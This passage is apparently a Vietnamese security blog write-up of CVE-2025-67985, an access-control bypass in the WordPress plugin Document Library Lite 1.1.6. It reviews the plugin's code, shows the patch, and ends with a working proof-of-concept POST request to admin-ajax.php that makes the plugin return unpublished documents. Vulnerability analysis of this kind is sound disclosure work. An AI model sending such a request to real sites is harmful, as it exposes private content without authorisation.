2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;Document Library Lite&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;1.1.6&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;1.2.0&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ diff nào.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;div class=&#34;alert alert-note&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M0 8a8 8 0 1116 0A8 8 0 010 8zm8-6.5a6.5 6.5.0 100 13 6.5 6.5.0 000-13zM6.5 7.75A.75.75.0 017.25 7h1a.75.75.0 01.75.75v2.75h.25a.75.75.0 010 1.5h-2a.75.75.0 010-1.5h.25v-2h-.25a.75.75.0 01-.75-.75zM8 6a1 1 0 110-2 1 1 0 010 2z&#34;/&gt;&lt;/svg&gt;Ghi chú&lt;/p&gt;&lt;p&gt;Lỗ hổng được công bố ảnh hưởng từ phiên bản 1.1.7 trở xuống nhưng thực chất đã được vá trong phiên bản 1.1.7. Ta tải xuống phiên bản 1.1.6 để phân tích.&lt;/p&gt;&lt;/div&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin đã đăng ký action hook:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action( &amp;#39;wp_ajax_nopriv_dll_load_posts&amp;#39;, [ $this, &amp;#39;load_posts&amp;#39; ] );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;wp_ajax_nopriv_&lt;/code&gt; là hook dành cho tất cả người dùng (kể cả chưa đăng nhập). Bất kỳ ai đều có thể gọi AJAX action:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;/wp-admin/admin-ajax.php?action=dll_load_posts&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Và thực thi hàm &lt;code&gt;load_posts()&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;const SHORTCODE = &amp;#39;doc_library&amp;#39;;&#xA;public function load_posts() {&#xA;    $args = Options::handle_shortcode_attribute_aliases( $_POST[ &amp;#39;args&amp;#39; ] );&#xA;    $args = shortcode_atts( Options::get_defaults(), $args, self::SHORTCODE );&#xA;&#xA;    $table = new simple_Document_Library( $args );&#xA;    $response = $table-&amp;gt;get_table( &amp;#39;array&amp;#39; );&#xA;&#xA;    // Return the response as JSON&#xA;    wp_send_json($response);   &#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm &lt;code&gt;load_posts()&lt;/code&gt; gọi đến &lt;code&gt;handle_shortcode_attribute_aliases&lt;/code&gt; với tham số đầu vào &lt;code&gt;$_POST[ &#39;args&#39; ]&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function handle_shortcode_attribute_aliases( $atts ) {&#xA;    if ( isset( $atts[&amp;#39;content&amp;#39;] ) ) {&#xA;        $atts[&amp;#39;columns&amp;#39;] = $atts[&amp;#39;content&amp;#39;];&#xA;        unset( $atts[&amp;#39;content&amp;#39;] );&#xA;    }&#xA;&#xA;    if ( isset( $atts[&amp;#39;docs_per_page&amp;#39;] ) ) {&#xA;        $atts[&amp;#39;rows_per_page&amp;#39;] = $atts[&amp;#39;docs_per_page&amp;#39;];&#xA;        unset( $atts[&amp;#39;docs_per_page&amp;#39;] );&#xA;    }&#xA;&#xA;    return $atts;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm này chỉ thực hiện ánh xạ (đổi tên) tham số:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;content&lt;/code&gt; → &lt;code&gt;columns&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;docs_per_page&lt;/code&gt; → &lt;code&gt;rows_per_page&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Sau đó trả lại mảng &lt;code&gt;$atts&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;Tiếp theo hàm &lt;code&gt;load_posts()&lt;/code&gt; gọi đến:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$args = shortcode_atts( Options::get_defaults(), $args, self::SHORTCODE );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;nhằm gộp tham số mặc định (&lt;code&gt;Options::get_defaults()&lt;/code&gt;) với &lt;code&gt;$args&lt;/code&gt; do người dùng truyền vào:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-20-cve-2025-67985/option.png&#34; title=&#34;Các option mặc định của shortcode&#34; data-thumbnail=&#34;/posts/2025-12-20-cve-2025-67985/option.png&#34; data-sub-html=&#34;&lt;h2&gt;Option&lt;/h2&gt;&lt;p&gt;Các option mặc định của shortcode&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-20-cve-2025-67985/option.png&#39; alt=&#34;Option&#34; height=&#34;475&#34; width=&#34;669&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Các option mặc định của shortcode&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Trong đó, &lt;code&gt;status&lt;/code&gt; quyết định trạng thái document được hiển thị.&lt;/p&gt;&#xA;&lt;p&gt;Có thể thay đổi status của Document khi tạo/edit:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-20-cve-2025-67985/status.png&#34; title=&#34;Thay đối status&#34; data-thumbnail=&#34;/posts/2025-12-20-cve-2025-67985/status.png&#34; data-sub-html=&#34;&lt;h2&gt;Status&lt;/h2&gt;&lt;p&gt;Thay đối status&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-20-cve-2025-67985/status.png&#39; alt=&#34;Status&#34; height=&#34;581&#34; width=&#34;1518&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Thay đối status&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;pending&lt;/code&gt; và &lt;code&gt;draft&lt;/code&gt; là trạng thái chưa công khai của document. Chỉ những người có quyền mới xem được.&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;load_posts()&lt;/code&gt; khởi tạo &lt;code&gt;simple_Document_Library&lt;/code&gt; với &lt;code&gt;$args&lt;/code&gt; do người dùng cung cấp:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$table = new simple_Document_Library( $args );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;validate_options()&lt;/code&gt; được gọi trong constructor của &lt;code&gt;simple_Document_Library&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function __construct( $args ) {&#xA;    $this-&amp;gt;args = $this-&amp;gt;validate_options( $args );&#xA;    $this-&amp;gt;set_post_args();&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Ở đây không chỉ tồn tại 3 trạng thái: &lt;code&gt;publish&lt;/code&gt;, &lt;code&gt;pending&lt;/code&gt;, &lt;code&gt;draft&lt;/code&gt; mà còn 2 trạng thái &lt;code&gt;future&lt;/code&gt; và &lt;code&gt;any&lt;/code&gt; xuất hiện trong hàm &lt;code&gt;validate_options&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function validate_options( $args ) {&#xA;    // Validate all the boolean options in the database&#xA;    $boolean_options = [ &amp;#39;lazy_load&amp;#39;, &amp;#39;lightbox&amp;#39;, &amp;#39;wrap&amp;#39;, &amp;#39;search_on_click&amp;#39; ];&#xA;&#xA;    foreach( $boolean_options as $option ) {&#xA;        $args[ $option ] = is_string( $args[ $option ] ) ? $args[ $option ] === &amp;#34;true&amp;#34; : $args[ $option ];&#xA;    }&#xA;&#xA;    // The post status can only have these values&#xA;    $valid_post_statuses = [ &amp;#39;publish&amp;#39;, &amp;#39;pending&amp;#39;, &amp;#39;draft&amp;#39;, &amp;#39;future&amp;#39;, &amp;#39;any&amp;#39; ];&#xA;    $args[ &amp;#39;status&amp;#39; ] = in_array( $args[&amp;#39;status&amp;#39;], $valid_post_statuses ) ? $args[ &amp;#39;status&amp;#39; ] : &amp;#39;publish&amp;#39;;&#xA;    &#xA;    return $args;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm này chỉ kiểm tra giá trị hợp lệ, không kiểm tra quyền.&lt;/p&gt;&#xA;&lt;p&gt;status cho phép &lt;code&gt;pending&lt;/code&gt;, &lt;code&gt;draft&lt;/code&gt;, &lt;code&gt;future&lt;/code&gt;, &lt;code&gt;any&lt;/code&gt;, nên user có thể dùng các giá trị này để xem document chưa được phép công khai → &lt;strong&gt;bypass phân quyền&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$response = $table-&amp;gt;get_table( &amp;#39;array&amp;#39; );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;get_table&lt;/code&gt; được gọi:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function get_table( $output_type = &amp;#39;html&amp;#39; ) {&#xA;    $columns = $this-&amp;gt;get_columns();&#xA;&#xA;    // Parse DataTables parameters from the AJAX request&#xA;    $draw   = isset( $_POST[&amp;#39;draw&amp;#39;] ) ? intval( $_POST[&amp;#39;draw&amp;#39;] ) : 1;&#xA;    $this-&amp;gt;args[&amp;#39;offset&amp;#39;]  = isset( $_POST[&amp;#39;start&amp;#39;] ) ? intval( $_POST[&amp;#39;start&amp;#39;] ) : 0;&#xA;    $this-&amp;gt;args[&amp;#39;rows_per_page&amp;#39;] = isset( $_POST[&amp;#39;length&amp;#39;] ) &amp;amp;&amp;amp; intval( $_POST[&amp;#39;length&amp;#39;] ) !== -1 ? intval( $_POST[&amp;#39;length&amp;#39;] ) : $this-&amp;gt;args[&amp;#39;rows_per_page&amp;#39;];&#xA;    $this-&amp;gt;args[&amp;#39;sort_by&amp;#39;] = isset( $_POST[&amp;#39;order&amp;#39;] ) ? $columns[$_POST[&amp;#39;order&amp;#39;][0][&amp;#39;column&amp;#39;]] : $this-&amp;gt;get_orderby();&#xA;    $this-&amp;gt;args[&amp;#39;sort_order&amp;#39;] = isset( $_POST[&amp;#39;order&amp;#39;] ) ? $_POST[&amp;#39;order&amp;#39;][0][&amp;#39;dir&amp;#39;] : $this-&amp;gt;args[&amp;#39;sort_order&amp;#39;];&#xA;    $this-&amp;gt;args[&amp;#39;search_value&amp;#39;] = isset( $_POST[&amp;#39;search&amp;#39;] ) ? $_POST[&amp;#39;search&amp;#39;][&amp;#39;value&amp;#39;] : &amp;#39;&amp;#39;;&#xA;    $this-&amp;gt;args[&amp;#39;rows_per_page&amp;#39;] = filter_var( $this-&amp;gt;args[&amp;#39;rows_per_page&amp;#39;], FILTER_VALIDATE_INT );&#xA;&#xA;    if ( $this-&amp;gt;args[&amp;#39;rows_per_page&amp;#39;] &amp;lt; 1 || ! $this-&amp;gt;args[&amp;#39;rows_per_page&amp;#39;] ) {&#xA;        $this-&amp;gt;args[&amp;#39;rows_per_page&amp;#39;] = false;&#xA;    }&#xA;    if( isset( $_POST[&amp;#39;category&amp;#39;] ) ) {&#xA;        $this-&amp;gt;args[&amp;#39;doc_category&amp;#39;] = $_POST[&amp;#39;category&amp;#39;];&#xA;    }&#xA;&#xA;    if ( ! in_array( $this-&amp;gt;args[&amp;#39;sort_by&amp;#39;], Options::get_allowed_columns(), true ) ) {&#xA;        $this-&amp;gt;args[&amp;#39;sort_by&amp;#39;] = Options::get_default_settings()[&amp;#39;sort_by&amp;#39;];&#xA;    }&#xA;&#xA;    if ( ! in_array( $this-&amp;gt;args[&amp;#39;sort_order&amp;#39;], [ &amp;#39;asc&amp;#39;, &amp;#39;desc&amp;#39; ], true ) ) {&#xA;        $this-&amp;gt;args[&amp;#39;sort_order&amp;#39;] = Options::get_default_settings()[&amp;#39;sort_order&amp;#39;];&#xA;    }&#xA;&#xA;    // Set default sort direction&#xA;    if ( ! $this-&amp;gt;args[&amp;#39;sort_order&amp;#39;] ) {&#xA;        if ( $this-&amp;gt;args[&amp;#39;sort_by&amp;#39;] === &amp;#39;date&amp;#39; ) {&#xA;            $this-&amp;gt;args[&amp;#39;sort_order&amp;#39;] = &amp;#39;desc&amp;#39;;&#xA;        } else {&#xA;            $this-&amp;gt;args[&amp;#39;sort_order&amp;#39;] = &amp;#39;asc&amp;#39;;&#xA;        }&#xA;    }&#xA;&#xA;    $this-&amp;gt;args[&amp;#39;content_length&amp;#39;]  = filter_var( $this-&amp;gt;args[&amp;#39;content_length&amp;#39;], FILTER_VALIDATE_INT );&#xA;    $this-&amp;gt;args[&amp;#39;scroll_offset&amp;#39;]   = filter_var( $this-&amp;gt;args[&amp;#39;scroll_offset&amp;#39;], FILTER_VALIDATE_INT );&#xA;&#xA;    if ( empty( $this-&amp;gt;args[&amp;#39;date_format&amp;#39;] ) ) {&#xA;        $this-&amp;gt;args[&amp;#39;date_format&amp;#39;] = Options::get_default_settings()[&amp;#39;date_format&amp;#39;];&#xA;    }&#xA;&#xA;    $output       = &amp;#39;&amp;#39;;&#xA;    $table_body   = &amp;#39;&amp;#39;;&#xA;    $body_row_fmt = &amp;#39;&amp;#39;;&#xA;&#xA;    // After an AJAX request, the paramaters should be set again&#xA;    $this-&amp;gt;set_post_args();&#xA;    // Get all published posts in the current language&#xA;    $all_posts = $this-&amp;gt;run_table_query( $this-&amp;gt;build_table_query( $this-&amp;gt;post_args ) );&#xA;&#xA;    // Bail early if no posts found&#xA;    if ( ! $all_posts || ! is_array( $all_posts ) ) {&#xA;        return $output;&#xA;    }&#xA;    &#xA;    // Add placeholder to table body format string so that content for this column is included in table output&#xA;    $cell_fmt     = &amp;#39;&amp;lt;td&amp;gt;{%s}&amp;lt;/td&amp;gt;&amp;#39;;&#xA;    $array_output = [];&#xA;    foreach ( $columns as $column ) {&#xA;        $body_row_fmt .= sprintf( $cell_fmt, $column );&#xA;    }&#xA;    if ( $output_type === &amp;#39;html&amp;#39; ) {&#xA;        // Build table body&#xA;        $body_row_fmt = &amp;#39;&amp;lt;tr&amp;gt;&amp;#39; . $body_row_fmt . &amp;#39;&amp;lt;/tr&amp;gt;&amp;#39;;&#xA;&#xA;        // Loop through posts and add a row for each&#xA;        foreach ( (array) $all_posts as $_post ) {&#xA;            setup_postdata( $_post );&#xA;&#xA;            $post_data_trans = apply_filters(&#xA;                &amp;#39;document_library_table_row_data_format&amp;#39;,&#xA;                $this-&amp;gt;get_row_content( $_post )&#xA;            );&#xA;&#xA;            $table_body .= strtr( $body_row_fmt, $post_data_trans );&#xA;        } // foreach post&#xA;&#xA;        wp_reset_postdata();&#xA;        return $table_body;&#xA;    } else {&#xA;        // Loop through posts and add a row for each&#xA;        foreach ( (array) $all_posts as $_post ) {&#xA;            setup_postdata( $_post );&#xA;            $array_output[] = $this-&amp;gt;get_row_content( $_post );&#xA;        }&#xA;    }&#xA;&#xA;    // Increment the table count&#xA;    &amp;#43;&amp;#43;self::$table_count;&#xA;    if ( $output_type === &amp;#39;html&amp;#39; ) {&#xA;        return apply_filters( &amp;#39;document_library_table_html_output&amp;#39;, $output, $this-&amp;gt;args );&#xA;    } else {&#xA;        $total_posts = $this-&amp;gt;get_total_posts();&#xA;&#xA;        // Prepare the response&#xA;        $response = [&#xA;            &amp;#39;draw&amp;#39;            =&amp;gt; $draw,&#xA;            &amp;#39;recordsTotal&amp;#39;    =&amp;gt; $total_posts,&#xA;            &amp;#39;recordsFiltered&amp;#39; =&amp;gt; $total_posts, // You can filter further if you add search functionality&#xA;            &amp;#39;data&amp;#39;            =&amp;gt; $array_output,&#xA;        ];&#xA;&#xA;        wp_send_json( $response );&#xA;&#xA;        // return &amp;#34;&amp;#34;;&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;get_table()&lt;/code&gt; lấy nhiều tham số trực tiếp từ &lt;code&gt;$_POST&lt;/code&gt;, gán vào &lt;code&gt;$this-&amp;gt;args&lt;/code&gt; và dùng chúng để xây dựng, thực thi truy vấn document mà &lt;strong&gt;không kiểm tra quyền người dùng&lt;/strong&gt;. Do &lt;code&gt;$args&lt;/code&gt; ban đầu (bao gồm &lt;code&gt;status&lt;/code&gt;) là dữ liệu do client kiểm soát, người dùng có thể truy vấn và nhận về các document ở trạng thái &lt;code&gt;pending&lt;/code&gt; hoặc &lt;code&gt;draft&lt;/code&gt;, kết quả được trả thẳng qua JSON, dẫn tới &lt;strong&gt;bypass phân quyền / IDOR&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Cuối cùng, &lt;code&gt;wp_send_json($response)&lt;/code&gt; &lt;strong&gt;trả toàn bộ dữ liệu document cho client&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;wp_send_json($response);   &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Bản vá đã chặn triệt để lỗ hổng bằng cách:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Ép user chưa đăng nhập chỉ được xem document &lt;code&gt;publish&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;Nếu status khác &lt;code&gt;publish&lt;/code&gt; mà người dùng không có quyền &lt;code&gt;edit_posts&lt;/code&gt; =&amp;gt; trả về &lt;code&gt;error&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-20-cve-2025-67985/patch.png&#34; title=&#34;Bản vá&#34; data-thumbnail=&#34;/posts/2025-12-20-cve-2025-67985/patch.png&#34; data-sub-html=&#34;&lt;h2&gt;Patch&lt;/h2&gt;&lt;p&gt;Bản vá&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-20-cve-2025-67985/patch.png&#39; alt=&#34;Patch&#34; height=&#34;612&#34; width=&#34;1519&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Bản vá&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;&#xA;A[&amp;#34;Unauthenticated user&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Send POST request to /wp-admin/admin-ajax.php?action=dll_load_posts with args[status]=pending|draft|future|any&amp;#34;]&#xA;B --&amp;gt; C[&amp;#34;wp_ajax_nopriv_dll_load_posts hook triggered&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;Ajax_Handler::load_posts()&amp;#34;]&#xA;D --&amp;gt; E[&amp;#34;Read user-controlled $_POST[&amp;#39;args&amp;#39;]&amp;#34;]&#xA;E --&amp;gt; F[&amp;#34;Options::handle_shortcode_attribute_aliases()&amp;#34;]&#xA;F --&amp;gt; G[&amp;#34;Merge with default options via shortcode_atts()&amp;#34;]&#xA;G --&amp;gt; H[&amp;#34;Initialize simple_Document_Library($args)&amp;#34;]&#xA;H --&amp;gt; I[&amp;#34;validate_options(): only validate value, no permission check&amp;#34;]&#xA;I --&amp;gt; J[&amp;#34;status accepted: publish/pending/draft/future/any&amp;#34;]&#xA;J --&amp;gt; K[&amp;#34;Build query using user-controlled status&amp;#34;]&#xA;K --&amp;gt; L[&amp;#34;Query documents including non-public ones&amp;#34;]&#xA;L --&amp;gt; M[&amp;#34;get_table(&amp;#39;array&amp;#39;)&amp;#34;]&#xA;M --&amp;gt; N[&amp;#34;wp_send_json(response)&amp;#34;]&#xA;N --&amp;gt; O[&amp;#34;Non-public documents returned to user&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Gửi request:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;&#xA;action=dll_load_posts&amp;amp;args[status]=any&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Result&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-20-cve-2025-67985/result.png&#34; title=&#34;Result&#34; data-thumbnail=&#34;/posts/2025-12-20-cve-2025-67985/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Result&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-20-cve-2025-67985/result.png&#39; alt=&#34;Result&#34; height=&#34;856&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Result&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng xảy ra do AJAX endpoint công khai tin tưởng tham số &lt;code&gt;status&lt;/code&gt; do client kiểm soát và sử dụng trực tiếp để truy vấn document mà không kiểm tra quyền. Điều này cho phép người dùng chưa đăng nhập truy cập các document chưa được công khai, dẫn đến bypass kiểm soát truy cập / IDOR.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 